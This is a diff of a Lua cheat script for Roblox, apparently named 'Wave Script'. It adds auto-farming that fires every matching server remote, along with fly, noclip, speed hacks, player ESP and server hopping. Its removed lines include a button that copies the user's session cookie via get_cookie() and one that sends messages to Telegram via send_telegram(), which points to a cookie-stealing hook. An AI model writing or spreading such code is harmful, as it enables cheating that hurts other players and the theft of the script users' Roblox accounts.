-                        r:FireServer()
-                    end
+local farms = {candy=false, pets=false, eggs=false, money=false, all=false}
+
+local function doFarm(hint)
+    pcall(function()
+        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+            if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
+                local n = r.Name:lower()
+                if n:find(hint) or n:find("claim") or n:find("collect") or n:find("reward") or n:find("farm") then
+                    pcall(function() r:FireServer() end)
+                    pcall(function() r:InvokeServer() end)
                 end
-            end)
-            task.wait(0.6)
+            end
+        end
+        -- also try common GUI buttons
+        for _, g in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+            if g:IsA("TextButton") or g:IsA("ImageButton") then
+                local t = (g.Text or g.Name or ""):lower()
+                if t:find(hint) or t:find("claim") or t:find("collect") then
+                    pcall(function() firesignal(g.MouseButton1Click) end)
+                end
+            end
         end
     end)
 end
 
-addToggle(farmPage, "Auto Farm Candy", false, function(v) farms.candy = v; if v then farmLoop("candy", "candy") end end)
-addToggle(farmPage, "Auto Farm Pets", false, function(v) farms.pets = v; if v then farmLoop("pets", "pet") end end)
-addToggle(farmPage, "Auto Farm Eggs", false, function(v) farms.eggs = v; if v then farmLoop("eggs", "egg") end end)
-addToggle(farmPage, "Auto Farm Money / Bucks", false, function(v) farms.money = v; if v then farmLoop("money", "money") end end)
-addToggle(farmPage, "Auto Farm Everything", false, function(v)
+local function startFarm(key, hint)
+    farms[key] = true
+    task.spawn(function()
+        while farms[key] or farms.all do
+            doFarm(hint)
+            task.wait(0.55)
+        end
+    end)
+end
+
+toggle(farmP, "Candy / Sweets", false, function(v) if v then startFarm("candy", "candy") else farms.candy=false end end)
+toggle(farmP, "Pets", false, function(v) if v then startFarm("pets", "pet") else farms.pets=false end end)
+toggle(farmP, "Eggs", false, function(v) if v then startFarm("eggs", "egg") else farms.eggs=false end end)
+toggle(farmP, "Money / Bucks", false, function(v) if v then startFarm("money", "money") else farms.money=false end end)
+toggle(farmP, "Everything", false, function(v)
     farms.all = v
     if v then
-        farmLoop("all", "claim")
-        farmLoop("all", "collect")
-        farmLoop("all", "reward")
+        startFarm("all", "claim")
+        startFarm("all", "collect")
+        startFarm("all", "reward")
     end
 end)
 
-addBtn(farmPage, "Stop All Farms", function()
+button(farmP, "Stop All Farms", function()
     for k in pairs(farms) do farms[k] = false end
 end)
 
--- ─────────────────────────────────────────────
---  VISUAL TAB (client-side only)
--- ─────────────────────────────────────────────
-local visPage = Pages["Visual"]
-addLabel(visPage, "Visual Pet Tools (client only)", 20)
+----------------------------------------------------------------
+-- VISUAL
+----------------------------------------------------------------
+local visP = Pages["Visual"]
+label(visP, "Client Visuals", 20)
 
-addBtn(visPage, "Visual Equip Random Pet", function()
+button(visP, "Spawn Visual Random Pet", function()
     pcall(function()
-        local folder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
-        if not folder then return end
-        local pets = folder:GetChildren()
-        if #pets == 0 then return end
-        local pet = pets[math.random(1, #pets)]:Clone()
-        pet.Parent = LocalPlayer.Character or workspace
-        if pet:IsA("Model") and pet.PrimaryPart then
-            pet:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0))
+        local sources = {
+            ReplicatedStorage:FindFirstChild("Pets"),
+            ReplicatedStorage:FindFirstChild("PetModels"),
+            ReplicatedStorage:FindFirstChild("ClientPets"),
+            workspace:FindFirstChild("Pets")
+        }
+        for _, folder in pairs(sources) do
+            if folder then
+                local list = folder:GetChildren()
+                if #list > 0 then
+                    local pet = list[math.random(1, #list)]:Clone()
+                    pet.Parent = LocalPlayer.Character or workspace
+                    if pet:IsA("Model") then
+                        local root = pet.PrimaryPart or pet:FindFirstChildWhichIsA("BasePart")
+                        if root and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                            pet:PivotTo(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
+                        end
+                    end
+                    return
+                end
+            end
         end
     end)
 end)
 
-addBtn(visPage, "Clear Visual Pets", function()
+button(visP, "Clear Visual Pets", function()
     pcall(function()
-        for _, v in pairs(LocalPlayer.Character:GetChildren()) do
-            if v.Name:lower():find("pet") or v:FindFirstChild("Pet") then
+        local char = LocalPlayer.Character
+        if not char then return end
+        for _, v in pairs(char:GetChildren()) do
+            if v.Name:lower():find("pet") or v:FindFirstChild("Handle") then
                 v:Destroy()
             end
         end
     end)
 end)
 
-addBtn(visPage, "Visual Neon Glow", function()
+button(visP, "Neon Glow on Character", function()
     pcall(function()
-        local char = LocalPlayer.Character
-        if not char then return end
-        for _, p in pairs(char:GetDescendants()) do
+        for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
             if p:IsA("BasePart") then
-                local light = Instance.new("PointLight")
-                light.Color = Color3.fromRGB(0, 255, 200)
-                light.Brightness = 2
-                light.Range = 8
-                light.Parent = p
+                local l = Instance.new("PointLight")
+                l.Color = Color3.fromRGB(160, 80, 255)
+                l.Brightness = 2.5
+                l.Range = 10
+                l.Parent = p
             end
         end
     end)
 end)
 
-addBtn(visPage, "Remove All Lights", function()
+button(visP, "Remove Lights", function()
     pcall(function()
         for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
             if l:IsA("PointLight") or l:IsA("SpotLight") then l:Destroy() end
@@ -553,44 +703,44 @@ addBtn(visPage, "Remove All Lights", function()
     end)
 end)
 
--- ─────────────────────────────────────────────
---  MISC TAB (30+ functions total across tabs)
--- ─────────────────────────────────────────────
-local miscPage = Pages["Misc"]
-addLabel(miscPage, "Utility & Extra", 20)
+button(visP, "Fullbright", function()
+    Lighting.Brightness = 2
+    Lighting.ClockTime = 14
+    Lighting.FogEnd = 9e9
+    Lighting.GlobalShadows = false
+    Lighting.OutdoorAmbient = Color3.fromRGB(180, 180, 180)
+end)
 
--- 1 WalkSpeed
-addBtn(miscPage, "WalkSpeed 50", function()
-    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end)
-end)
--- 2
-addBtn(miscPage, "WalkSpeed 100", function()
-    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end)
-end)
--- 3
-addBtn(miscPage, "Reset WalkSpeed", function()
-    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end)
-end)
--- 4 Jump
-addBtn(miscPage, "JumpPower 100", function()
-    pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end)
-end)
--- 5
-addBtn(miscPage, "Infinite Jump", function()
-    local conn
-    conn = UserInputService.JumpRequest:Connect(function()
-        pcall(function()
-            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+----------------------------------------------------------------
+-- PLAYER TAB (movement etc)
+----------------------------------------------------------------
+local plrP = Pages["Player"]
+label(plrP, "Player", 20)
+
+button(plrP, "WalkSpeed 50", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end) end)
+button(plrP, "WalkSpeed 100", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end) end)
+button(plrP, "Reset Speed", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end) end)
+button(plrP, "JumpPower 100", function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end) end)
+
+local infJump = false
+toggle(plrP, "Infinite Jump", false, function(v)
+    infJump = v
+    if v then
+        UserInputService.JumpRequest:Connect(function()
+            if infJump then
+                pcall(function() LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
+            end
         end)
-    end)
+    end
 end)
--- 6 Noclip
+
 local noclip = false
-addToggle(miscPage, "Noclip", false, function(v)
+toggle(plrP, "Noclip", false, function(v)
     noclip = v
     if v then
-        RunService.Stepped:Connect(function()
-            if not noclip then return end
+        local conn
+        conn = RunService.Stepped:Connect(function()
+            if not noclip then conn:Disconnect() return end
             pcall(function()
                 for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                     if p:IsA("BasePart") then p.CanCollide = false end
@@ -599,86 +749,85 @@ addToggle(miscPage, "Noclip", false, function(v)
         end)
     end
 end)
--- 7 Fly
+
 local flying = false
-addToggle(miscPage, "Fly (PC)", false, function(v)
+toggle(plrP, "Fly (PC WASD + Space/Shift)", false, function(v)
     flying = v
-    if v then
-        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if not hrp then return end
-        local bv = Instance.new("BodyVelocity")
-        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-        bv.Velocity = Vector3.zero
-        bv.Parent = hrp
-        local bg = Instance.new("BodyGyro")
-        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-        bg.Parent = hrp
-        task.spawn(function()
-            while flying and hrp and hrp.Parent do
-                local dir = Camera.CFrame.LookVector
-                local move = Vector3.zero
-                if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + dir end
-                if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - dir end
-                if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - Camera.CFrame.RightVector end
-                if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + Camera.CFrame.RightVector end
-                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
-                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
-                bv.Velocity = move.Unit * 60
-                bg.CFrame = Camera.CFrame
-                task.wait()
-            end
-            if bv then bv:Destroy() end
-            if bg then bg:Destroy() end
-        end)
-    end
+    if not v then return end
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    local bv = Instance.new("BodyVelocity")
+    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+    bv.Velocity = Vector3.zero
+    bv.Parent = hrp
+    local bg = Instance.new("BodyGyro")
+    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+    bg.P = 9e4
+    bg.Parent = hrp
+    task.spawn(function()
+        while flying and hrp and hrp.Parent do
+            local dir = Vector3.zero
+            local look = Camera.CFrame.LookVector
+            local right = Camera.CFrame.RightVector
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += look end
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= look end
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= right end
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += right end
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir -= Vector3.yAxis end
+            bv.Velocity = dir.Magnitude > 0 and dir.Unit * 70 or Vector3.zero
+            bg.CFrame = Camera.CFrame
+            RunService.RenderStepped:Wait()
+        end
+        if bv then bv:Destroy() end
+        if bg then bg:Destroy() end
+    end)
 end)
--- 8 ESP players
-addBtn(miscPage, "Player ESP", function()
+
+button(plrP, "Player ESP", function()
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            if plr.Character.HumanoidRootPart:FindFirstChild("WaveESP") then continue end
             local bill = Instance.new("BillboardGui")
-            bill.Size = UDim2.new(0, 100, 0, 30)
+            bill.Name = "WaveESP"
+            bill.Size = UDim2.new(0, 120, 0, 28)
             bill.AlwaysOnTop = true
             bill.Adornee = plr.Character.HumanoidRootPart
             bill.Parent = plr.Character.HumanoidRootPart
-            local txt = Instance.new("TextLabel")
-            txt.Size = UDim2.new(1, 0, 1, 0)
-            txt.BackgroundTransparency = 1
-            txt.Text = plr.Name
-            txt.TextColor3 = Color3.fromRGB(0, 255, 150)
-            txt.Font = Enum.Font.GothamBold
-            txt.TextSize = 12
-            txt.Parent = bill
+            local t = Instance.new("TextLabel")
+            t.Size = UDim2.new(1, 0, 1, 0)
+            t.BackgroundTransparency = 1
+            t.Text = plr.Name
+            t.TextColor3 = Color3.fromRGB(180, 120, 255)
+            t.Font = Enum.Font.GothamBold
+            t.TextSize = 12
+            t.Parent = bill
         end
     end
 end)
--- 9 FPS unlock
-addBtn(miscPage, "FPS Unlocker (setfpscap 0)", function()
-    pcall(function() setfpscap(0) end)
-end)
--- 10 Anti AFK
-addBtn(miscPage, "Anti AFK", function()
+
+button(plrP, "Anti AFK", function()
     local vu = game:GetService("VirtualUser")
     LocalPlayer.Idled:Connect(function()
         vu:CaptureController()
         vu:ClickButton2(Vector2.new())
     end)
 end)
--- 11 Rejoin
-addBtn(miscPage, "Rejoin Server", function()
+
+button(plrP, "Rejoin", function()
     TeleportService:Teleport(game.PlaceId, LocalPlayer)
 end)
--- 12 Server hop
-addBtn(miscPage, "Server Hop", function()
+
+button(plrP, "Server Hop", function()
     pcall(function()
         local req = get_request()
         if not req then return end
-        local body = req({
-            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
+        local resp = req({
+            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=50",
             Method = "GET"
         })
-        local data = HttpService:JSONDecode(body.Body)
-        for _, s in pairs(data.data) do
+        local data = HttpService:JSONDecode(resp.Body)
+        for _, s in pairs(data.data or {}) do
             if s.playing < s.maxPlayers and s.id ~= game.JobId then
                 TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
                 break
@@ -686,112 +835,38 @@ addBtn(miscPage, "Server Hop", function()
         end
     end)
 end)
--- 13 Fullbright
-addBtn(miscPage, "Fullbright", function()
-    Lighting.Brightness = 2
-    Lighting.ClockTime = 14
-    Lighting.FogEnd = 100000
-    Lighting.GlobalShadows = false
-end)
--- 14 XRay
-addBtn(miscPage, "XRay Walls", function()
-    for _, p in pairs(workspace:GetDescendants()) do
-        if p:IsA("BasePart") and p.Transparency < 1 then
-            p.LocalTransparencyModifier = 0.7
-        end
-    end
-end)
--- 15 Reset character
-addBtn(miscPage, "Reset Character", function()
+
+button(plrP, "Reset Character", function()
     pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end)
 end)
--- 16 Copy JobId
-addBtn(miscPage, "Copy JobId", function()
-    if setclipboard then setclipboard(game.JobId) end
-end)
--- 17 Copy PlaceId
-addBtn(miscPage, "Copy PlaceId", function()
-    if setclipboard then setclipboard(tostring(game.PlaceId)) end
-end)
--- 18 Copy Cookie
-addBtn(miscPage, "Copy Cookie to Clipboard", function()
-    if setclipboard then setclipboard(get_cookie()) end
-end)
--- 19 Send test TG
-addBtn(miscPage, "Send Test Message to TG", function()
-    send_telegram("Wave Script test from " .. LocalPlayer.Name)
-end)
--- 20 Destroy GUI
-addBtn(miscPage, "Destroy Wave Script", function()
-    Gui:Destroy()
-end)
 
--- ─────────────────────────────────────────────
---  SETTINGS TAB
--- ─────────────────────────────────────────────
-local setPage = Pages["Settings"]
-addLabel(setPage, "Settings", 20)
+----------------------------------------------------------------
+-- SETTINGS
+----------------------------------------------------------------
+local setP = Pages["Settings"]
+label(setP, "Settings", 20)
 
 local toggleKey = Enum.KeyCode.RightControl
-addLabel(setPage, "Toggle Key: RightControl (PC)", 16)
+label(setP, "Current Toggle Key: RightControl")
 
-addBtn(setPage, "Set Toggle Key to LeftControl", function()
-    toggleKey = Enum.KeyCode.LeftControl
-end)
-addBtn(setPage, "Set Toggle Key to RightShift", function()
-    toggleKey = Enum.KeyCode.RightShift
-end)
+button(setP, "Set Key → LeftControl", function() toggleKey = Enum.KeyCode.LeftControl end)
+button(setP, "Set Key → RightShift", function() toggleKey = Enum.KeyCode.RightShift end)
+button(setP, "Set Key → F6", function() toggleKey = Enum.KeyCode.F6 end)
 
-local function saveConfig()
-    -- simple in-memory, can extend with writefile if executor supports
-    pcall(function()
-        if writefile then
-            writefile("WaveScript_Config.json", HttpService:JSONEncode({
-                key = tostring(toggleKey),
-                autoAccept = autoAccept
-            }))
-        end
-    end)
-end
-addBtn(setPage, "Save Config", saveConfig)
+button(setP, "Destroy Script", function() Gui:Destroy() end)
 
-addBtn(setPage, "Load Config", function()
-    pcall(function()
-        if readfile and isfile and isfile("WaveScript_Config.json") then
-            local data = HttpService:JSONDecode(readfile("WaveScript_Config.json"))
-            -- apply if needed
-        end
-    end)
-end)
-
--- ─────────────────────────────────────────────
---  DRAG + TOGGLE LOGIC
--- ─────────────────────────────────────────────
-local dragging, dragStart, startPos
-FloatBtn.InputBegan:Connect(function(input)
+----------------------------------------------------------------
+-- OPEN / CLOSE LOGIC
+----------------------------------------------------------------
+TopBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = FloatBtn.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        FloatBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
-FloatBtn.MouseButton1Click:Connect(function()
-    Main.Visible = not Main.Visible
-    if Main.Visible then
-        Main.Size = UDim2.new(0, 0, 0, 0)
-        TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 520, 0, 380)
-        }):Play()
+        Main.Visible = not Main.Visible
+        if Main.Visible then
+            Main.Size = UDim2.new(0, 0, 0, 0)
+            TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, 560, 0, 420)
+            }):Play()
+        end
     end
 end)
 
@@ -799,43 +874,45 @@ CloseBtn.MouseButton1Click:Connect(function()
     TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
         Size = UDim2.new(0, 0, 0, 0)
     }):Play()
-    task.wait(0.25)
-    Main.Visible = false
+    task.delay(0.25, function() Main.Visible = false end)
 end)
 
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
     if input.KeyCode == toggleKey then
         Main.Visible = not Main.Visible
     end
 end)
 
--- mobile scale
+-- mobile adjust
 if UserInputService.TouchEnabled then
-    Main.Size = UDim2.new(0.9, 0, 0.75, 0)
-    Main.Position = UDim2.new(0.05, 0, 0.12, 0)
+    TopBar.Size = UDim2.new(0.7, 0, 0, 36)
+    TopBar.Position = UDim2.new(0.15, 0, 0, 10)
+    Main.Size = UDim2.new(0.92, 0, 0.78, 0)
+    Main.Position = UDim2.new(0.04, 0, 0.11, 0)
 end
 
--- welcome animation
+-- welcome
 task.spawn(function()
-    local welcome = Instance.new("TextLabel")
-    welcome.Size = UDim2.new(0, 300, 0, 40)
-    welcome.Position = UDim2.new(0.5, -150, 0.15, 0)
-    welcome.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
-    welcome.BackgroundTransparency = 0.2
-    welcome.Text = "Wave Script loaded"
-    welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
-    welcome.Font = Enum.Font.GothamMedium
-    welcome.TextSize = 16
-    welcome.Parent = Gui
-    Instance.new("UICorner", welcome).CornerRadius = UDim.new(0, 12)
-    welcome.TextTransparency = 1
-    TweenService:Create(welcome, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
-    task.wait(2.2)
-    TweenService:Create(welcome, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
-    task.wait(0.6)
-    welcome:Destroy()
+    local w = Instance.new("TextLabel")
+    w.Size = UDim2.new(0, 280, 0, 42)
+    w.Position = UDim2.new(0.5, -140, 0.18, 0)
+    w.BackgroundColor3 = Color3.fromRGB(40, 25, 65)
+    w.Text = "Wave Script loaded"
+    w.TextColor3 = Color3.fromRGB(240, 230, 255)
+    w.Font = Enum.Font.GothamMedium
+    w.TextSize = 15
+    w.Parent = Gui
+    Instance.new("UICorner", w).CornerRadius = UDim.new(0, 12)
+    local st = Instance.new("UIStroke")
+    st.Color = Color3.fromRGB(130, 80, 200)
+    st.Parent = w
+    w.TextTransparency = 1
+    TweenService:Create(w, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    task.wait(2)
+    TweenService:Create(w, TweenInfo.new(0.45), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
+    task.wait(0.5)
+    w:Destroy()
 end)
 
-switchTab("Main")
-print("[Wave Script] injected")
+switch("Main")
